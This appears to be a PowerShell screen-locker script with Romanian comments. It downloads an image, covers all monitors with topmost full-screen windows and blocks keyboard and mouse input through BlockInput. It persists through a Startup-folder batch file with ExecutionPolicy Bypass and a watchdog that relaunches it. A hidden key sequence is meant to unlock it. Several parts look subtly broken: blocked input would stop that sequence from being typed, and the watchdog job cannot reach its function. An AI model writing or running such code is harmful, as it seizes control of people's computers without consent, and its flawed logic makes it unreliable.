# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

# Funcție pentru descărcarea imaginii
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Funcție pentru blocarea tastelor critice
function Block-Keys {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class InterceptKeys {
        [DllImport("user32.dll")]
        public static extern int BlockInput(bool block);
    }
"@
    [InterceptKeys]::BlockInput($true)
}

# Funcție pentru deblocarea tastelor
function Unblock-Keys {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class InterceptKeys {
        [DllImport("user32.dll")]
        public static extern int BlockInput(bool block);
    }
"@
    [InterceptKeys]::BlockInput($false)
}

# Afișare imagine pe toate monitoarele
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screens = [System.Windows.Forms.Screen]::AllScreens
    $forms = @()

    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.StartPosition = 'Manual'
        $form.Location = $screen.Bounds.Location
        $form.Size = $screen.Bounds.Size

        try {
            $img = [System.Drawing.Image]::FromFile($tempImagePath)
        } catch {
            Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
            exit
        }

        $pictureBox = New-Object System.Windows.Forms.PictureBox
        $pictureBox.Image = $img
        $pictureBox.Dock = 'Fill'
        $pictureBox.SizeMode = 'StretchImage'
        $form.Controls.Add($pictureBox)

        $forms += $form
    }

    # Ascultare pentru introducerea codului secret
    $global:keySequence = ""
    $forms[0].Add_KeyDown({
        param($sender, $eventArgs)
        $global:keySequence += $eventArgs.KeyChar
        if ($global:keySequence -like "*cdr") {
            Stop-All
        }
    })

    foreach ($form in $forms) {
        [void]$form.Show()
    }

    [System.Windows.Forms.Application]::Run()
}

# Funcție pentru oprirea completă a aplicației
function Stop-All {
    $global:exitFlag = $true
    Unblock-Keys
    Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat" -Force -ErrorAction SilentlyContinue
    exit
}

# Configurare pornire automată
function Set-Startup {
    $scriptPath = $MyInvocation.MyCommand.Path
    $batFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat"
    $batContent = "@echo off`nstart /min powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
    Set-Content -Path $batFilePath -Value $batContent -Force
}

# Monitorizare proces pentru repornire automată
function Monitor-Image {
    while ($true) {
        $processes = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*PersistentImage.ps1*" }
        if (-not $processes) {
            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$MyInvocation.MyCommand.Path`"" -WindowStyle Hidden
        }
        Start-Sleep -Seconds 2
    }
}

# Executare funcționalități
Download-Image
Set-Startup
Block-Keys
Start-Job -ScriptBlock { Monitor-Image }
Show-FullScreenImage
